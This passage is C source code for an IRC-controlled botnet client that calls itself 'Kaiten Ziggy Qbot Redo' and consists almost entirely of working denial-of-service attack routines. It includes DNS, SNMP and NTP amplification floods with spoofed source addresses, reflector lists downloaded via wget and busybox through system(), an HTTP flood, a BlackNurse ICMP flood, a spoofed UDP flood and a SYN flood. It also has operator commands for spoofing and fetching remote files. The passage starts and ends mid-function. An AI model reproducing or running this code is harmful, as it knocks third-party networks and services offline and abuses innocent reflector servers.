        Send(sock2,"GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock, "NOTICE %s :Receiving file.\n", sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if(i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if(!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock, "NOTICE %s :Saved as %s\n", sender,argv[2]);
        while(1) {
                int i,d;
                if((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if(i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}

void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if(spoofsm == 1) Send(sock, "NOTICE %s :Spoofs: %d.%d.%d.%d\n", sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock, "NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n", sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}

void version(int sock, char *sender, int argc, char **argv) {
        Send(sock, "NOTICE %s :Kaiten Ziggy Qbot Redo by Milenko version 14.0.0\n", sender);
}

void nickc(int sock, char *sender, int argc, char **argv) {
        if(argc != 1) {
                Send(sock, "NOTICE %s :NICK <nick>\n", sender);
                return;
        }
        if(strlen(argv[1]) >= 33) {
                Send(sock, "NOTICE %s :Nick cannot be larger than 32 characters.\n", sender);
                return;
        }
        nick = argv[1];
        Send(sock, "NICK %s\n",argv[1]);
}

int realrand(int low, int high) {
  srand(time(NULL) + getpid());
  return (rand() % (high + 1 - low) + low);
}

void rndnick(int sock, char *sender, int argc, char **argv) {
        nick = randstring(realrand(4, 8));
        Send(sock, "NICK [%s|%s]%s\n", PREFIX, getBuild(), nick);
}

void disable(int sock, char *sender, int argc, char **argv) {
        if(argc != 1) {
                Send(sock, "NOTICE %s :DISABLE <pass>\n", sender);
                Send(sock, "NOTICE %s :Current status is: %s\n", sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
    if(disabled) {
        Send(sock, "NOTICE %s :Already disabled.\n", sender);
        return;
    }
    if(strlen(argv[1]) > 254) {
                Send(sock, "NOTICE %s :Password too long! > 254\n", sender);
                return;
    }
        disabled=1;
    memset(dispass,0,256);
    strcpy(dispass,argv[1]);
    Send(sock, "NOTICE %s :Disable sucessful.\n");
}

void enable(int sock, char *sender, int argc, char **argv) {
        if(argc != 1) {
                Send(sock, "NOTICE %s :ENABLE <pass>\n", sender);
                Send(sock, "NOTICE %s :Current status is: %s\n", sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
    if(!disabled) {
        Send(sock, "NOTICE %s :Already enabled.\n", sender);
        return;
    }
    if(strcasecmp(dispass,argv[1])) {
        Send(sock, "NOTICE %s :Wrong password\n", sender);
        return;
    }
        disabled=0;
    Send(sock, "NOTICE %s :Password correct.\n", sender);
}

void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        struct sockaddr_in addr;
        if(argc != 1) {
                Send(sock, "NOTICE %s :Removed all spoofs\n", sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if(strlen(argv[1]) > 16) {
                Send(sock, "NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n", sender);
                return;
        }
        strcpy(ip,argv[1]);
        if(ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if(ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        inet_aton(ip, &(addr.sin_addr));
        uip = addr.sin_addr.s_addr;
        if(num == 0) spoofsm=1;
        else spoofsm=poww(256,num);
        spoofs=uip;
}
struct send_tcp {
    struct iphdr ip;
    struct tcphdr tcp;
    char buf[20];
};
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
    char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}

static uint32_t Q[4096], c = 362436;

struct list
{
                struct sockaddr_in data;
                char domain[512];
                int line;
                struct list *next;
                struct list *prev;
};
struct list *head;

struct thread_data{
                int thread_id;
                struct list *list_node;
                struct sockaddr_in sin;
                int port;
};

struct DNS_HEADER
{
                unsigned short id; // identification number

                unsigned char rd :1; // recursion desired
                unsigned char tc :1; // truncated message
                unsigned char aa :1; // authoritive answer
                unsigned char opcode :4; // purpose of message
                unsigned char qr :1; // query/response flag

                unsigned char rcode :4; // response code
                unsigned char cd :1; // checking disabled
                unsigned char ad :1; // authenticated data
                unsigned char z :1; // its z! reserved
                unsigned char ra :1; // recursion available

                unsigned short q_count; // number of question entries
                unsigned short ans_count; // number of answer entries
                unsigned short auth_count; // number of authority entries
                unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
        unsigned short qtype;
        unsigned short qclass;
};

//Constant sized fields of the resource record structure
struct QUERY
{
                unsigned char *name;
                struct QUESTION *ques;
};

void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
                int lock = 0 , i;
                strcat((char*)host,".");

                for(i = 0 ; i < strlen((char*)host) ; i++)
                {
                                if(host[i]=='.')
                                {
                                                *dns++ = i-lock;
                                                for(;lock<i;lock++)
                                                {
                                                                *dns++=host[lock];
                                                }
                                                lock++; //or lock=i+1;
                                }
                }
                *dns++='\0';
}
void init_rand(uint32_t x)
{
                int i;

                Q[0] = x;
                Q[1] = x + PHI;
                Q[2] = x + PHI + PHI;

                for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
                uint64_t t, a = 18782LL;
                static uint32_t i = 4095;
                uint32_t x, r = 0xfffffffe;
                i = (i + 1) & 4095;
                t = a * Q[i] + c;
                c = (t >> 32);
                x = t + c;
                if(x < c) {
                                x++;
                                c++;
                }
                return (Q[i] = r - x);
}

void setup_udp_header(struct udphdr *udph)
{

}

void *dnsflood(void *par1)
{
                if(listFork()) return;
                struct thread_data *td = (struct thread_data *)par1;

                char strPacket[MAX_PACKET_SIZE];
                int iPayloadSize = 0;

                struct sockaddr_in sin = td->sin;
                struct list *list_node = td->list_node;
                int iPort = td->port;

                int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
                if(s < 0) {
                        exit(-1);
                }

                //init random
                init_rand(time(NULL));

                // Clear the data
                memset(strPacket, 0, MAX_PACKET_SIZE);

                // Make the packet
                struct iphdr *iph = (struct iphdr *) &strPacket;
                iph->ihl = 5;
                iph->version = 4;
                iph->tos = 0;
                iph->tot_len = sizeof(struct iphdr) + 38;
                iph->id = htonl(54321);
                iph->frag_off = 0;
                iph->ttl = MAXTTL;
                iph->protocol = IPPROTO_UDP;
                iph->check = 0;
                iph->saddr = inet_addr("192.168.3.100");

                iPayloadSize += sizeof(struct iphdr);


                struct udphdr *udph = (struct udphdr *) &strPacket[iPayloadSize];
                udph->source = htons(iPort);
                udph->dest = htons(53);
                udph->check = 0;

                iPayloadSize += sizeof(struct udphdr);

                struct DNS_HEADER *dns = (struct DNS_HEADER *) &strPacket[iPayloadSize];
                dns->id = (unsigned short) htons(rand_cmwc());
                dns->qr = 0; //This is a query
                dns->opcode = 0; //This is a standard query
                dns->aa = 0; //Not Authoritative
                dns->tc = 0; //This message is not truncated
                dns->rd = 1; //Recursion Desired
                dns->ra = 0; //Recursion not available! hey we dont have it 
                dns->z = 0;
                dns->ad = 0;
                dns->cd = 0;
                dns->rcode = 0;
                dns->q_count = htons(1); //we have only 1 question
                dns->ans_count = 0;
                dns->auth_count = 0;
                dns->add_count = htons(1);

                iPayloadSize += sizeof(struct DNS_HEADER);

                sin.sin_port = udph->source;
                iph->saddr = sin.sin_addr.s_addr;
                iph->daddr = list_node->data.sin_addr.s_addr;
                iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);


                char strDomain[512];
                int i;
                int j = 0;
                int iAdditionalSize = 0;
                while(1)
                {
                        if(j==2){
                                usleep(100);
                                j=0;
                        }



                        //set the next node
                        list_node = list_node->next;

                        //Clear the old domain and question
                        memset(&strPacket[iPayloadSize + iAdditionalSize], 0, iAdditionalSize+256);

                        //add the chosen domain and question
                        iAdditionalSize = 0;

                        unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];

                        strcpy(strDomain, list_node->domain);
                        ChangetoDnsNameFormat(qname, strDomain);
                        //printf("!!%s %d\n", list_node->domain, list_node->line);

                        iAdditionalSize += strlen(qname) + 1;

                        struct QUESTION *qinfo = (struct QUESTION *) &strPacket[iPayloadSize + iAdditionalSize];
                        qinfo->qtype = htons(255); //type of the query , A , MX , CNAME , NS etc
                        qinfo->qclass = htons(1);

                        iAdditionalSize += sizeof(struct QUESTION);

                        strPacket[iPayloadSize + iAdditionalSize] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 1] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 2] = 0x29;
                        strPacket[iPayloadSize + iAdditionalSize + 3] = 0x23;
                        strPacket[iPayloadSize + iAdditionalSize + 4] = 0x28;
                        strPacket[iPayloadSize + iAdditionalSize + 5] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 6] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 7] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 8] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 9] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 10] = 0x00;
                        strPacket[iPayloadSize + iAdditionalSize + 11] = 0x00;

                        iAdditionalSize += 11;


                        //set new node data
                        iph->daddr = list_node->data.sin_addr.s_addr;

                        udph->len= htons((iPayloadSize + iAdditionalSize) - sizeof(struct iphdr));
                        iph->tot_len = iPayloadSize + iAdditionalSize;

                        udph->source = htons(rand_cmwc() & 0xFFFF);
                        iph->check = csum ((unsigned short *) strPacket, iph->tot_len >> 1);

                        //send
                        for(i = 0; i < PACKETS_PER_RESOLVER; i++)
                        {
                                sendto(s, strPacket, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
                        }

                        j++;
                }
}

void ParseResolverLine(char *strLine, int iLine)
{
        char caIP[32] = "";
        char caDNS[512] = "";

        int i;
        char buffer[512] = "";

        int moved = 0;

        for(i = 0; i < strlen(strLine); i++)
        {
                if(strLine[i] == ' ' || strLine[i] == '\n' || strLine[i] == '\t')
                {
                        moved++;
                        continue;
                }

                if(moved == 0)
                {
                        caIP[strlen(caIP)] = (char) strLine[i];
                }
                else if(moved == 1)
                {
                        caDNS[strlen(caDNS)] = (char) strLine[i];
                }
        }

        //printf("Found resolver %s, domain %s!\n", caIP, caDNS);

        if(head == NULL)
        {
                head = (struct list *)malloc(sizeof(struct list));

                bzero(&head->data, sizeof(head->data));

                head->data.sin_addr.s_addr=inet_addr(caIP);
                head->data.sin_port=htons(53);
                strcpy(head->domain, caDNS);
                head->line = iLine;
                head->next = head;
                head->prev = head;
        }
        else
        {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));

                memset(new_node, 0x00, sizeof(struct list));

                new_node->data.sin_addr.s_addr=inet_addr(caIP);
                new_node->data.sin_port=htons(53);
                strcpy(new_node->domain, caDNS);
                new_node->prev = head;
                head->line = iLine;
                new_node->next = head->next;
                head->next = new_node;
        }
}

void dns(int sockfd, char *sender, int argc, char **argv)
{
        if(mfork(sender) != 0) return;
        int get;
        if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if(argc < 5) {
                Send(sock, "NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\n", sender);
                exit(-1);
        }
        char command[1024];
        int myLen = 160 + (strlen(argv[3]) * 5);
        if(myLen >= 1024) {
            return;
        }
        snprintf(command, myLen, "wget \"%s\" -q -O DNS.txt || busybox wget \"%s\" -O DNS.txt || /bin/busybox wget \"%s\" -O DNS.txt || /usr/busybox wget \"%s\" -O DNS.txt || /var/run/busybox wget \"%s\" -O DNS.txt", argv[3], argv[3], argv[3], argv[3], argv[3]);
        system(command);
        head = NULL;
        char *strLine = (char *) malloc(256);
        strLine = memset(strLine, 0x00, 256);
        char strIP[32] = "";
        char strDomain[256] = "";
        int iLine = 0; // 0 = ip, 1 = domain.
        FILE *list_fd = fopen("DNS.txt",  "r");
        while(fgets(strLine, 256, list_fd) != NULL) {
                ParseResolverLine(strLine, iLine);
                iLine++;
        }


        int i = 0;
        int num_threads = atoi(argv[4]);

        struct list *current = head->next;
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(0);
        sin.sin_addr.s_addr = inet_addr(argv[1]);
        struct thread_data td[num_threads];

        int iPort = atoi(argv[2]);

        for(i = 0; i < num_threads; i++)
        {
                td[i].thread_id = i;
                td[i].sin= sin;
                td[i].list_node = current;
                td[i].port = iPort;
                dnsflood((void *) &td[i]);
        }

        Send(sock, "NOTICE %s :DNS amp attacking %s:%s\n", sender,argv[1],argv[2]);
        if(argc > 4)
        {
                sleep(atoi(argv[5]));
        }

       exit(1);
}

/* NEW AND IMPROVED SNMPv2 AMPLIFICATION DDOS SKRIPT. */

struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 83;

void setup_snmp_header(struct udphdr *udph)
{
    udph->source = htons(4500);
    udph->dest = htons(161);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x45\x00\x00\x43\x00\x00\x40\x00\x40\x11\xe0\xce\xa8\xeb\x46\x40\x29\xb5\x40\xfb\xce\x19\x00\xa1\x00\x2f\x0a\x13\x30\x25\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x18\x02\x04\x30\x54\xbc\x3f\x02\x01\x00\x02\x02\x08\xca\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00", 67);
    udph->len=htons(sizeof(struct udphdr) + 67);
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 14;
    iph->id = htonl(64074);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.83");
}

void *snmpflood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct  list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        exit(-1);
    }
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_snmp_header(udph);
    udph->source = htons(rand() % 65535 - 1026);
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        
        pps++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

void snmp(int sock, char *sender, int argc, char**argv) {
    if(mfork(sender) != 0) return;
    int get;
    if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
    if(argc < 6){
        Send(sock, "NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\n", sender);
        exit(-1);
    }
    
    char command[1024];
    int myLen = 165 + (strlen(argv[3]) * 5);
    if(myLen >= 1024) {
        return;
    }
    snprintf(command, myLen, "wget \"%s\" -q -O SNMP.txt || busybox wget \"%s\" -O SNMP.txt || /bin/busybox wget \"%s\" -O SNMP.txt || /usr/busybox wget \"%s\" -O SNMP.txt || /var/run/busybox wget \"%s\" -O SNMP.txt", argv[3], argv[3], argv[3], argv[3], argv[3]);
    system(command);
    srand(time(NULL));
    int i = 0;
    head = NULL;
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    FILE *list_fd = fopen("SNMP.txt",  "r");
    while(fgets(buffer, max_len, list_fd) != NULL) {
        if((buffer[strlen(buffer) - 1] == '\n') ||
                (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr=inet_addr(buffer);
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        } else {
            continue;
        }
    }
    struct list *current = head->next;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = current;
        snmpflood((void *) &td[i]);
    }
    
    Send(sock, "NOTICE %s :SNMP amp attacking %s:%s\n", sender,argv[1],argv[2]);
    
    for(i = 0;i<(atoi(argv[6])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    return;
}

void wgetHTTP(int sock, char *sender, int argc, char **argv) {
    unsigned char *url;
    int end_time;
    if(mfork(sender) != 0) return;
    if(argc < 2) {
        Send(sock, "NOTICE %s :WGETFLOOD <url> <secs>\n", sender);
        exit(1);
    }

    url = argv[1];
    end_time = atoi(argv[2]);

    int end = time(NULL) + end_time;
    char *UA = UserAgents[(rand() % 36)];
    char command[1024];

    Send(sock, "NOTICE %s :HTTP Flooding %s\n", sender, url);
    
    
    while(end > time(NULL))
    {
        UA = UserAgents[(rand() % 36)];
        snprintf(command, 164 + (strlen(UA) * 4) + (strlen(url) * 4), "wget -U \"%s\" -q \"%s\" -O /dev/null || busybox wget -U \"%s\" -q \"%s\" -O /dev/null || /bin/busybox wget -U \"%s\" -q \"%s\" -O /dev/null || /usr/busybox wget -U \"%s\" -q \"%s\" -O /dev/null &", UA, url, UA, url, UA, url, UA, url);
        system(command);
    }
      exit(1);
}

void *ntpflood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct  list *list_node = td->list_node;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        exit(-1);
    }
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_udp_header(udph);
    udph->source = htons((rand() % (65535 - 1026)) + 1026);
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        exit(-1);
    }
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        
        pps++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

void ntp(int sock, char *sender, int argc, char **argv) {
    if(mfork(sender) != 0) return;
    int get;
    if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
    if(argc < 6) {
        Send(sock, "NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\n", sender);
        exit(1);
    }
    char command[1024];
    int myLen = 160 + (strlen(argv[3]) * 5);
    if(myLen >= 1024) {
        return;
    }
    snprintf(command, myLen, "wget \"%s\" -q -O NTP.txt || busybox wget \"%s\" -O NTP.txt || /bin/busybox wget \"%s\" -O NTP.txt || /usr/busybox wget \"%s\" -O NTP.txt || /var/run/busybox wget \"%s\" -O NTP.txt", argv[3], argv[3], argv[3], argv[3], argv[3]);
    system(command);
    srand(time(NULL));
    int i = 0;
    head = NULL;
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    FILE *list_fd = fopen("NTP.txt",  "r");
    while(fgets(buffer, max_len, list_fd) != NULL) {
        if((buffer[strlen(buffer) - 1] == '\n') ||
                (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr=inet_addr(buffer);
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        } else {
            continue;
        }
    }
    struct list *current = head->next;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = current;
        ntpflood((void *) &td[i]);
    }
    
    Send(sock, "NOTICE %s :NTP amp attacking %s:%s\n", sender,argv[1],argv[2]);

    for(i = 0;i<(atoi(argv[6])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    exit(0);
}

void blacknurse(int sock, char *sender, int argc, char *argv[])
{
    uint8_t pkt_template[] = {
        0x03, 0x03, 0x0d, 0x33, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x1c, 0x4a, 0x04, 0x00, 0x00,
        0x40, 0x06, 0x20, 0xc5, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x08, 0xef, 0xc1
    };
    uint8_t         *pkt;
    struct addrinfo *ai, hints;
    const char      *host;
    struct pollfd    pfd;
    const size_t     pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t           i;
    int              gai_err;
    int              kindy;
    int x, secs,get;

    time_t start=time(NULL);
    if(mfork(sender) != 0) return;
    if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);

    if(argc < 2) {
        Send(sock, "NOTICE %s :BLACKNURSE <target ip> <secs>", sender);
        exit(1);
    }

    host = argv[1];
    secs = atoi(argv[2]);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if((gai_err = getaddrinfo(host, NULL, &hints, &ai)) != 0) {
        exit(1);
    }
    if((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket");
        exit(1);
    }
    Send(sock, "NOTICE %s :Blacknursing %s\n", sender, host);
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if(sendto(kindy, pkt, pkt_len, 0,
                   ai->ai_addr, ai->ai_addrlen) != (ssize_t) pkt_len) {
            if(errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            perror("sendto");
            break;
        }
        if(i >= 100) {
            if(time(NULL) >= start+secs) exit(0);
            x=0;
        }
        x++;
    }
    /* NOTREACHED */
    close(kindy);
    freeaddrinfo(ai);

    return;
}

void udp(int sock, char *sender, int argc, char **argv) {
        unsigned int port,i=0;
        unsigned long psize,target,secs;
        struct sockaddr_in s_in;
        struct iphdr *ip;
    struct udphdr *udp;
    char buf[1500],*str;
        int get;
        time_t start=time(NULL);
        if(mfork(sender) != 0) return;
        if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if(argc < 3) {
                Send(sock, "NOTICE %s :UDP <target> <port> <secs>\n", sender);
                exit(1);
        }
        target = host2ip(sender,argv[1]);
        port = atoi(argv[2]);
        secs = atol(argv[3]);
        ip=(void*)buf;
       udp=(void*)(buf+sizeof(struct iphdr));
        str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
        memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
        Send(sock, "NOTICE %s :Packeting %s\n", sender,argv[1]);
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = 1500;
        ip->frag_off = 0;
        ip->protocol = 17;
        ip->ttl = 64;
        ip->daddr = target;
        udp->len = htons(psize);
        s_in.sin_family = AF_INET;
        s_in.sin_addr.s_addr = target;
        for (;;) {
                udp->source = rand();
                if(port) udp->dest = htons(port);
                else udp->dest = rand();
                udp->check = in_cksum((u_short *)buf,1500);
                ip->saddr = getspoof();
                ip->id = rand();
                ip->check = in_cksum((u_short *)buf,1500);
                s_in.sin_port = udp->dest;
                sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
                if(i >= 100) {
                        if(time(NULL) >= start+secs) exit(0);
                        i=0;
                }
                i++;
        }
}
void pan(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        time_t start=time(NULL);
        if(mfork(sender) != 0) return;
        int get;
        if((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if(argc < 3) {
                Send(sock, "NOTICE %s :PAN <target> <port> <secs>\n", sender);
                exit(1);
        }
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock, "NOTICE %s :Panning %s\n", sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 2048;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        srand(time(NULL) + getpid());
        while(1) {
                if(atoi(argv[2]) == 0) dest=rand();
                source=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = source;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = source;
